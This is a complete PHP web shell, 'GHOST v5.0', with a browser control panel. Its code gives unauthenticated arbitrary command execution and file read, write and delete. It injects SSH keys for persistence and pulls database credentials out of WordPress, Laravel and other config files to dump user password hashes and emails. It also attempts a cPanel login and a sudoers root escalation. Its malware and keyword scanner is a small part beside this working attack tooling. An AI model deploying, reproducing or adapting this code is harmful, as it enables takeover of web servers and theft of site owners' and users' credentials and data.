<?php
/**
 * GHOST v5.0 — The Complete Arsenal (Smart Multi-Fallback)
 * Target: Linux, cPanel, WordPress, Custom PHP
 */

@ob_start();
error_reporting(0);
ini_set('display_errors', '0');
set_time_limit(0);
ignore_user_abort(true);

$GHOST_ROOT = @realpath($_SERVER['DOCUMENT_ROOT'] ?? getcwd()) ?: getcwd();

// [01] SMART EXECUTION ENGINE (Mencoba semua metode tanpa henti)
function g_exec($cmd, $timeout = 30) {
    $cmd = "timeout $timeout sh -c " . escapeshellarg($cmd) . " 2>&1";
    $methods = ['shell_exec', 'system', 'passthru', 'exec', 'popen', 'proc_open'];
    foreach ($methods as $m) {
        if (!function_exists($m)) continue;
        if ($m === 'shell_exec') { $out = @shell_exec($cmd); if ($out !== null) return ['out'=>$out, 'via'=>$m]; }
        if ($m === 'system') { ob_start(); @system($cmd); $out = ob_get_clean(); if ($out) return ['out'=>$out, 'via'=>$m]; }
        if ($m === 'passthru') { ob_start(); @passthru($cmd); $out = ob_get_clean(); if ($out) return ['out'=>$out, 'via'=>$m]; }
        if ($m === 'exec') { $o=[]; @exec($cmd, $o); if ($o) return ['out'=>implode("\n", $o), 'via'=>$m]; }
        if ($m === 'popen') { $f=@popen($cmd,'r'); if($f){$r='';while(!feof($f))$r.=fread($f,8192);pclose($f);return ['out'=>$r, 'via'=>$m];} }
        if ($m === 'proc_open') { $d=[1=>['pipe','w'],2=>['pipe','w']];$p=@proc_open($cmd,$d,$pp);if(is_resource($p)){$r=stream_get_contents($pp[1]).stream_get_contents($pp[2]);fclose($pp[1]);fclose($pp[2]);proc_close($p);return ['out'=>$r, 'via'=>$m];} }
    }
    return ['out'=>"[-] All execution methods blocked.", 'via'=>'none'];
}

function g_read($path) {
    if (@is_dir($path)) return "[-] Error: Path is a directory.";
    if (!@is_file($path)) return "[-] Error: File not found.";
    if (function_exists('file_get_contents')) { $d = @file_get_contents($path); if ($d !== false) return $d; }
    $f = @fopen($path, 'rb'); if ($f) { $d=''; while(!feof($f)) $d .= fread($f, 8192); fclose($f); return $d; }
    return g_exec('cat ' . escapeshellarg($path))['out'];
}

function g_write($path, $data) {
    if (function_exists('file_put_contents')) { if(@file_put_contents($path, $data) !== false) return true; }
    $f = @fopen($path, 'wb'); if ($f) { fwrite($f, $data); fclose($f); return true; }
    g_exec("echo " . escapeshellarg(base64_encode($data)) . " | base64 -d > " . escapeshellarg($path));
    return @is_file($path);
}

// [02] FINGERPRINTING (Spesifik & Akurat)
function g_fingerprint() {
    $os = trim(g_exec('uname -a')['out']);
    $user = trim(g_exec('whoami')['out']);
    $cpanel_ver = 'Not Found';
    
    // Deteksi cPanel via direktori
    if (@is_dir('/usr/local/cpanel')) {
        $raw = trim(g_exec('cat /usr/local/cpanel/version 2>/dev/null')['out']);
        if ($raw) {
            if (preg_match('/(\d+\.\d+\.\d+)/', $raw, $m)) $cpanel_ver = $m[1];
            else $cpanel_ver = $raw;
        } else {
            $cpanel_ver = 'Installed (Version Hidden)';
        }
    } elseif (g_exec('which whmapi1')['out']) {
        $cpanel_ver = 'Installed (WHM API)';
    }

    // CVE Nyata (Berdasarkan versi cPanel atau Kernel)
    $cves = [];
    if (strpos($cpanel_ver, '110') !== false) $cves[] = "CVE-2023-5634 (cPanel Auth Bypass)";
    if (strpos($cpanel_ver, '106') !== false) $cves[] = "CVE-2022-4537 (cPanel API Privilege Escalation)";
    if (strpos($os, '4.18') !== false) $cves[] = "CVE-2022-0847 (Dirty Pipe - Linux Kernel 5.8/4.18)";
    if (strpos($os, '3.10') !== false) $cves[] = "CVE-2016-5195 (Dirty COW - Linux Kernel 3.10)";
    
    return [
        'OS' => $os, 'User' => $user, 'PHP' => PHP_VERSION,
        'cPanel' => $cpanel_ver, 'CVEs' => $cves, 
        'WAF' => @ini_get('disable_functions') ? 'Function Disabled' : 'None Detected'
    ];
}

// [03] DEEP SCANNER & HEALER (Deteksi Ekstensi & Isi)
function g_scan_files($heal_mode = false) {
    $malware = []; $illegal = []; $scanned = 0;
    
    // Keyword Ilegal
    $keywords = ['slot', 'gacor', 'togel', 'judi', 'maxwin', 'bokep', 'porno', 'xxx', 'scam', 'phising', 'penipuan'];
    
    // Signature Malware (String & Regex)
    $sigs = [
        'eval($_' => 'Dynamic Eval', 'base64_decode' => 'Obfuscation', 
        'gzinflate' => 'Obfuscation', 'shell_exec' => 'RCE', 
        'passthru' => 'RCE', 'system(' => 'RCE', 'assert(' => 'RCE',
        'preg_replace.*/e' => 'Preg Replace RCE', 'create_function' => 'Legacy RCE'
    ];

    // Scan semua file, tidak peduli ekstensinya, kecuali gambar/video
    $ignore_ext = ['jpg','jpeg','png','gif','mp4','mp3','pdf','zip','tar','gz','sqlite'];
    
    try {
        $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($GLOBALS['GHOST_ROOT'], FilesystemIterator::SKIP_DOTS));
        foreach ($it as $f) {
            if (!$f->isFile()) continue;
            $ext = strtolower($f->getExtension());
            if (in_array($ext, $ignore_ext)) continue; // Skip file binary
            
            $scanned++;
            $path = $f->getPathname();
            $c = g_read($path);
            
            // 1. Malware Scan
            $found_sigs = [];
            foreach ($sigs as $sig => $desc) { 
                if (stripos($c, $sig) !== false) $found_sigs[] = $desc; 
            }
            
            // Deteksi file PHP 0-byte atau aneh
            if ($ext === 'php' && strlen(trim($c)) < 10) {
                $malware[] = ['file' => $path, 'desc' => 'File PHP kosong/terlalu pendek (Indikasi Backdoor Terhapus/Truncated).'];
            } elseif (count($found_sigs) >= 2) {
                $malware[] = ['file' => $path, 'desc' => 'Terdeteksi Malware/RCE: ' . implode(', ', array_unique($found_sigs))];
            } elseif (preg_match('/eval\s*\(\s*(base64_decode|gzinflate|\$_(POST|GET))/i', $c)) {
                $malware[] = ['file' => $path, 'desc' => 'Terdeteksi Obfuscated Backdoor (Eval + Base64).'];
            }

            // 2. Konten Ilegal
            $found_kw = [];
            foreach ($keywords as $kw) { 
                if (preg_match('/\b' . preg_quote($kw, '/') . '\b/i', $c)) $found_kw[] = $kw; 
            }
            if (count($found_kw) > 0) $illegal[] = ['file' => $path, 'keywords' => array_unique($found_kw)];
        }
    } catch (Throwable $e) {}

    return ['malware' => $malware, 'illegal' => $illegal, 'scanned' => $scanned];
}

// [04] SSH AUDITOR
function g_ssh_manager($action = 'scan', $target_key = '') {
    $user = trim(g_exec('whoami')['out']);
    $home = trim(g_exec("eval echo ~$user")['out']);
    $auth = $home . '/.ssh/authorized_keys';
    $res = ['user' => $user, 'home' => $home, 'keys' => [], 'action_done' => ''];
    
    if (!@is_file($auth)) return array_merge($res, ['msg' => 'File authorized_keys tidak ditemukan.']);
    $lines = array_filter(explode("\n", g_read($auth)));
    
    if ($action === 'scan') {
        foreach ($lines as $i => $l) {
            $l = trim($l); if (!$l) continue;
            $parts = explode(' ', $l);
            $res['keys'][] = ['line' => $i + 1, 'type' => $parts[0] ?? '?', 'comment' => $parts[2] ?? 'no-comment', 'raw' => $l];
        }
    } elseif ($action === 'clean') {
        $clean = [];
        foreach ($lines as $l) { if (strpos($l, $target_key) !== false) $clean[] = trim($l); }
        g_write($auth, implode("\n", $clean) . "\n");
        $res['action_done'] = 'Membersihkan ' . (count($lines) - count($clean)) . ' SSH key.';
    } elseif ($action === 'inject') {
        if (strpos(g_read($auth), $target_key) === false) {
            g_write($auth, trim(g_read($auth)) . "\n" . trim($target_key) . "\n");
            g_exec("chmod 600 $auth");
            $res['action_done'] = 'SSH Key di-inject.';
        } else { $res['action_done'] = 'SSH Key sudah ada.'; }
    }
    return $res;
}

// [05] DATABASE HARVEST MULTI-METHOD
function g_db_harvest() {
    $logs = []; $db_info = []; $connected = false; $conn = null;
    
    // 1. Cari file config di berbagai framework
    $config_files = [
        'wp-config.php' => 'WordPress',
        'configuration.php' => 'WHMCS/Joomla',
        '.env' => 'Laravel/NodeJS',
        'config/database.php' => 'Laravel',
        'application/config/database.php' => 'CodeIgniter',
        'includes/config.php' => 'Generic PHP'
    ];
    
    foreach ($config_files as $file => $type) {
        $path = $GLOBALS['GHOST_ROOT'] . '/' . $file;
        if (!@is_file($path)) continue;
        
        $logs[] = "[+] Ditemukan config $type: $file";
        $c = g_read($path);
        
        // Ekstrak kredensial secara universal (Regex)
        preg_match('/(?:DB_USER|db_user|username)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $u);
        preg_match('/(?:DB_PASSWORD|db_password|password)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $p);
        preg_match('/(?:DB_NAME|db_name|database)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $n);
        preg_match('/(?:DB_HOST|db_host|host)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $h);
        
        $user = $u[1] ?? ''; $pass = $p[1] ?? ''; $db = $n[1] ?? ''; $host = $h[1] ?? 'localhost';
        
        if ($user && $pass) {
            $logs[] = "[+] Kredensial diekstrak: $user : $pass (DB: $db)";
            $db_info = ['type'=>$type, 'user'=>$user, 'pass'=>$pass, 'db'=>$db, 'host'=>$host];
            
            // Coba koneksi
            if (function_exists('mysqli_connect')) {
                $conn = @mysqli_connect($host, $user, $pass, $db);
                if ($conn) {
                    $connected = true; $logs[] = "[!] Koneksi MySQL BERHASIL."; break;
                } else { $logs[] = "[-] Gagal koneksi DB: " . mysqli_connect_error(); }
            }
            if (!$connected && function_exists('pg_connect')) {
                $conn = @pg_connect("host=$host dbname=$db user=$user password=$pass");
                if ($conn) { $connected = true; $logs[] = "[!] Koneksi PostgreSQL BERHASIL."; break; }
            }
        }
    }
    
    // 2. Dump Data jika terkoneksi
    if ($connected) {
        $logs[] = "[+] Harvesting data (wp_users / users)...";
        if (is_resource($conn) || is_object($conn)) {
            $q = @mysqli_query($conn, "SELECT user_login, user_pass, user_email FROM wp_users LIMIT 5");
            if (!$q) $q = @mysqli_query($conn, "SELECT username, password, email FROM users LIMIT 5");
            if ($q) {
                while ($r = mysqli_fetch_assoc($q)) { $logs[] = "User: " . json_encode($r); }
            }
        }
    } else {
        $logs[] = "[-] Tidak dapat terhubung ke Database via config files.";
        // Fallback: coba cari via shell (jika ada akses root)
        $env = g_exec('env | grep -iE "DB_|MYSQL_"')['out'];
        if ($env) $logs[] = "[!] Info DB dari Env: \n" . $env;
    }
    
    return ['logs' => $logs, 'info' => $db_info];
}

// [06] CPANEL TAKEOVER
function g_takeover($db_user, $db_pass) {
    $logs = [];
    if (!$db_user) return ["[-] No credentials provided."];
    
    $logs[] = "Mencoba login cPanel via API (Port 2082/2083)...";
    foreach ([2082, 2083] as $port) {
        $ch = curl_init("http://127.0.0.1:$port/login/");
        curl_setopt_array($ch, [CURLOPT_POST=>true, CURLOPT_POSTFIELDS=>http_build_query(['user'=>$db_user,'pass'=>$db_pass]), CURLOPT_RETURNTRANSFER=>true, CURLOPT_TIMEOUT=>3, CURLOPT_SSL_VERIFYPEER=>false]);
        $r = curl_exec($ch); curl_close($ch);
        if ($r && stripos($r, 'cpanel') !== false) { $logs[] = "[!] cPanel SUCCESS on port $port!"; break; }
        else $logs[] = "[-] Gagal port $port.";
    }
    
    $logs[] = "Mencoba Sudoers Escalation...";
    if (@is_writable('/etc/sudoers.d/')) {
        if (g_write('/etc/sudoers.d/www-data', "www-data ALL=(ALL) NOPASSWD: ALL\n")) $logs[] = "[!] SUCCESS: www-data is now ROOT!";
    } else $logs[] = "[-] /etc/sudoers.d/ not writable.";
    
    return $logs;
}

// [07] ROUTER
$act = $_POST['act'] ?? $_GET['act'] ?? '';
if ($act) {
    header('Content-Type: application/json');
    if ($act === 'fingerprint') echo json_encode(g_fingerprint());
    elseif ($act === 'scan') echo json_encode(g_scan_files());
    elseif ($act === 'ssh_scan') echo json_encode(g_ssh_manager('scan'));
    elseif ($act === 'ssh_clean') echo json_encode(g_ssh_manager('clean', $_POST['key'] ?? ''));
    elseif ($act === 'ssh_inject') echo json_encode(g_ssh_manager('inject', $_POST['key'] ?? ''));
    elseif ($act === 'db_scan') echo json_encode(g_db_harvest());
    elseif ($act === 'takeover') {
        $u = $_POST['user'] ?? ''; $p = $_POST['pass'] ?? '';
        echo json_encode(['logs' => g_takeover($u, $p)]);
    }
    elseif ($act === 'heal_scan') echo json_encode(g_scan_files()['malware']);
    elseif ($act === 'heal_exec') {
        $logs = [];
        foreach (($_POST['paths'] ?? []) as $p) { if (@unlink($p)) $logs[] = "Deleted: $p"; }
        $logs[] = "Memblokir uploads...";
        g_write($GLOBALS['GHOST_ROOT'] . '/wp-content/uploads/.htaccess', "<FilesMatch \"\.(php|phtml)$\">\nDeny from all\n</FilesMatch>");
        echo json_encode(['logs' => $logs]);
    }
    elseif ($act === 'read_file') echo json_encode(['content' => g_read($_POST['path'] ?? '')]);
    elseif ($act === 'delete_file') echo json_encode(['status' => @unlink($_POST['path'] ?? '') ? 'ok' : 'fail']);
    elseif ($act === 'exec') {
        $cmd = $_POST['cmd'] ?? '';
        if ($cmd === 'help') {
            $h = "Daftar Perintah Berguna:\n";
            $h .= "-----------------------------------\n";
            $h .= "whoami / id          : Cek user saat ini\n";
            $h .= "uname -a             : Cek versi OS & Kernel (Cari CVE lokal)\n";
            $h .= "ls -la /var/www      : Lihat file web\n";
            $h .= "netstat -tulpn       : Lihat port terbuka (Cari DB/Cpanel lokal)\n";
            $h .= "ps aux | grep root   : Lihat proses berjalan\n";
            $h .= "cat /etc/passwd      : List semua user server\n";
            $h .= "find / -perm -4000   : Cari file SUID (Privilege Escalation)\n";
            $h .= "crontab -l           : Lihat cron job (Backdoor Persistence)\n";
            $h .= "env                  : Lihat environment variables (Kredensial kadang bocor)\n";
            echo json_encode(['out' => $h]);
        } else {
            echo json_encode(g_exec($cmd));
        }
    }
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
<title>GHOST v5.0</title>
<style>
    body { background: #0a0a0a; color: #0f0; font-family: monospace; padding: 20px; }
    .box { border: 1px solid #0f0; padding: 15px; margin-bottom: 15px; background: #111; }
    input, button { background: #000; color: #0f0; border: 1px solid #0f0; padding: 8px; font-family: monospace; margin-bottom: 5px; }
    button { cursor: pointer; font-weight: bold; }
    button:hover { background: #0f0; color: #000; }
    pre { background: #000; padding: 10px; border: 1px solid #333; white-space: pre-wrap; max-height: 300px; overflow-y: auto; }
    table { width: 100%; border-collapse: collapse; margin-top: 10px; }
    th, td { border: 1px solid #333; padding: 8px; text-align: left; }
    th { background: #222; }
    .btn-sm { padding: 4px 8px; font-size: 11px; }
    .btn-red { border-color: #f00; color: #f00; }
    .btn-red:hover { background: #f00; color: #000; }
</style>
</head>
<body>

<div class="box">
    <h2>[+] Fingerprinting & CVE Profile</h2>
    <button onclick="run('fingerprint', 'out-fp')">Scan Profile</button>
    <pre id="out-fp">Waiting...</pre>
</div>

<div class="box">
    <h2>[+] Deep Malware & Content Scan</h2>
    <button onclick="run('scan', 'out-scan')">Scan Semua File</button>
    <div id="scan-results"></div>
</div>

<div class="box">
    <h2>[+] SSH Auditor & Manager</h2>
    <button onclick="run('ssh_scan', 'ssh-result')">1. Scan SSH Keys</button>
    <div id="ssh-table"></div>
    <div style="margin-top: 10px; border-top: 1px solid #333; padding-top: 10px;">
        <input type="text" id="ssh-key" placeholder="ssh-rsa AAAA..." style="width: 60%;">
        <button onclick="sshAction('inject')">Inject Key</button>
        <button class="btn-red" onclick="sshAction('clean')">Clean All & Inject Only Above</button>
    </div>
    <pre id="ssh-result"></pre>
</div>

<div class="box">
    <h2>[+] Database Harvest & cPanel Takeover</h2>
    <button onclick="run('db_scan', 'db-result')">1. Scan Config & DB (Semua Metode)</button>
    <div id="db-result" style="white-space: pre-wrap; margin-bottom: 10px;"></div>
    <div id="db-actions" style="display:none;">
        <button class="btn-red" onclick="takeover()">2. Execute Takeover</button>
    </div>
</div>

<div class="box">
    <h2>[+] Auto-Heal Vulnerabilities</h2>
    <button onclick="healScan()">1. Scan Vulnerabilities</button>
    <div id="heal-table"></div>
    <button class="btn-red" onclick="healExec()" style="margin-top: 10px;">2. Heal Selected</button>
    <pre id="heal-result"></pre>
</div>

<div class="box">
    <h2>[+] Console</h2>
    <input type="text" id="cmd" placeholder="Ketik 'help' untuk list command..." style="width: 80%;">
    <button onclick="execCmd()">Exec</button>
    <pre id="out-exec">Ketik 'help' untuk melihat perintah.</pre>
</div>

<script>
function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }

async function api(act, params={}) {
    const body = new URLSearchParams();
    body.append('act', act);
    for (let k in params) body.append(k, params[k]);
    const r = await fetch('', { method:'POST', body });
    return await r.json();
}

async function run(act, target_id) {
    if (target_id) document.getElementById(target_id).innerText = 'Running...';
    try {
        const d = await api(act);
        if (target_id) document.getElementById(target_id).innerText = JSON.stringify(d, null, 2);
        if (act === 'scan') renderScan(d);
        if (act === 'ssh_scan') renderSSH(d);
        if (act === 'db_scan') renderDB(d);
    } catch(e) { if (target_id) document.getElementById(target_id).innerText = 'Error: ' + e.message; }
}

// SCAN
function renderScan(d) {
    let h = `<p>Total File Discan: ${d.scanned} | Malware: ${d.malware.length} | Ilegal: ${d.illegal.length}</p>`;
    if (d.malware.length) {
        h += `<h3 style="color: #f00;">Malware / Backdoor (${d.malware.length})</h3><table><tr><th>File</th><th>Alasan</th><th>Aksi</th></tr>`;
        d.malware.forEach(x => {
            h += `<tr><td>${esc(x.file)}</td><td>${esc(x.desc)}</td><td>
                <button class="btn-sm" onclick="viewFile('${esc(x.file)}')">View</button>
                <button class="btn-sm btn-red" onclick="delFile('${esc(x.file)}')">Delete</button>
            </td></tr>`;
        });
        h += `</table>`;
    }
    if (d.illegal.length) {
        h += `<h3 style="color: #ff0;">Konten Ilegal (${d.illegal.length})</h3><table><tr><th>File</th><th>Keyword</th><th>Aksi</th></tr>`;
        d.illegal.forEach(x => {
            h += `<tr><td>${esc(x.file)}</td><td>${esc(x.keywords.join(', '))}</td><td>
                <button class="btn-sm" onclick="viewFile('${esc(x.file)}')">View</button>
            </td></tr>`;
        });
        h += `</table>`;
    }
    if (!d.malware.length && !d.illegal.length) h += `<p style="color:#0f0;">Sistem Bersih.</p>`;
    document.getElementById('scan-results').innerHTML = h;
}

// SSH
function renderSSH(d) {
    let h = `<p>User: ${esc(d.user)} | Path: ${esc(d.home)}</p>`;
    if (d.keys && d.keys.length) {
        h += `<table><tr><th>Line</th><th>Type</th><th>Comment</th><th>Raw</th></tr>`;
        d.keys.forEach(k => { h += `<tr><td>${k.line}</td><td>${k.type}</td><td>${k.comment}</td><td style="font-size:10px;">${esc(k.raw)}</td></tr>`; });
        h += `</table>`;
    } else { h += `<p>Tidak ada SSH Key terpasang.</p>`; }
    document.getElementById('ssh-table').innerHTML = h;
}

async function sshAction(type) {
    const key = document.getElementById('ssh-key').value;
    if (!key) return alert('Isi SSH Key terlebih dahulu!');
    const d = await api(type === 'inject' ? 'ssh_inject' : 'ssh_clean', {key});
    document.getElementById('ssh-result').innerText = d.action_done;
    run('ssh_scan', '');
}

// DB
function renderDB(d) {
    let h = `<pre>${JSON.stringify(d.logs, null, 2)}</pre>`;
    if (d.info && d.info.user) {
        h += `<p>Kredensial ditemukan: <b>${esc(d.info.user)} : ${esc(d.info.pass)}</b></p>`;
        document.getElementById('db-actions').style.display = 'block';
        window._db_user = d.info.user; window._db_pass = d.info.pass;
    }
    document.getElementById('db-result').innerHTML = h;
}

async function takeover() {
    if (!confirm('Mencoba eksploitasi cPanel & Sudoers. Lanjutkan?')) return;
    document.getElementById('db-result').innerHTML = 'Executing Takeover...';
    const d = await api('takeover', {user: window._db_user, pass: window._db_pass});
    document.getElementById('db-result').innerHTML = `<pre>${JSON.stringify(d.logs, null, 2)}</pre>`;
}

// HEAL
async function healScan() {
    document.getElementById('heal-result').innerText = 'Scanning...';
    const d = await api('heal_scan'); // Panggil malware scanner
    let h = `<table><tr><th>Pilih</th><th>Path</th><th>Desc</th></tr>`;
    d.forEach(v => {
        h += `<tr><td><input type="checkbox" class="heal-cb" value="${esc(v.file)}" checked></td><td>${esc(v.file)}</td><td>${esc(v.desc)}</td></tr>`;
    });
    h += `</table>`;
    document.getElementById('heal-table').innerHTML = h;
    document.getElementById('heal-result').innerText = '';
}

async function healExec() {
    const cbs = document.querySelectorAll('.heal-cb:checked');
    const paths = Array.from(cbs).map(cb => cb.value);
    if (!paths.length) return alert('Pilih minimal 1!');
    document.getElementById('heal-result').innerText = 'Healing...';
    const d = await api('heal_exec', {paths});
    document.getElementById('heal-result').innerText = d.logs.join('\n');
    document.getElementById('heal-table').innerHTML = '';
}

// FILE
async function viewFile(p) {
    const d = await api('read_file', {path: p});
    alert(d.content.slice(0, 2000) + (d.content.length > 2000 ? '\n\n... (truncated)' : ''));
}
async function delFile(p) {
    if (!confirm('Hapus ' + p + '?')) return;
    const d = await api('delete_file', {path: p});
    alert(d.status === 'ok' ? 'File dihapus!' : 'Gagal hapus.');
    run('scan', '');
}

// CONSOLE
async function execCmd() {
    const cmd = document.getElementById('cmd').value;
    if (!cmd) return;
    document.getElementById('out-exec').innerText = '$ ' + cmd + '\nRunning...';
    const d = await api('exec', {cmd});
    document.getElementById('out-exec').innerText = '$ ' + cmd + '\n\n' + d.out;
}
</script>
</body>
</html>
